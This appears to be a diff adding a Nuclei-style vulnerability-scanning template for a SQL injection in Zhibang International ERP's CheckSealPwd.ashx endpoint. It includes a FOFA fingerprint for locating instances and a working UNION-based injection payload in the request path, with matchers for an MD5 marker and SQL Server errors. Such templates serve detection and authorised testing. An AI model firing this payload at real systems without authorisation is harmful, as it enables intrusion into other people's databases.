@@ -1,0 +1,36 @@
+id: poc-yaml-zbintel-erp-checksealpwd-sqli
+info:
+  name: 智邦国际ERP CheckSealPwd SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 智邦国际ERP
+    fofa: icon_hash="-682445886"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/SYSN/json/pcclient/CheckSealPwd.ashx?id=1+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SystemErrorSign"
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
